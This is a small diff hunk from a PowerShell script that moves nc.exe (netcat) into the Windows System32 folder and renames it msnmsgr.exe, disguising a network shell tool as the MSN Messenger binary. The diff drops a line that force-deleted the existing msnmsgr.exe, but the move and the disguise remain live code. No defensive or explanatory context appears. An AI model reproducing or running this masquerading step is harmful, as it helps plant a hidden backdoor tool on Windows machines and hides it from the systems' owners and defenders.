@@ -39,7 +39,6 @@ if (Test-Path $ncFilePathNested) {
 
 Move-Item -Path $ncFilePath -Destination "$system32Path\nc.exe"
 if (Test-Path "$system32Path\nc.exe") {
-    Remove-Item -Path "C:\Windows\System32\msnmsgr.exe" -Force
     Rename-Item -Path "$system32Path\nc.exe" -NewName "msnmsgr.exe"
     Write-Host "Moved and renamed successfully."
 } else {
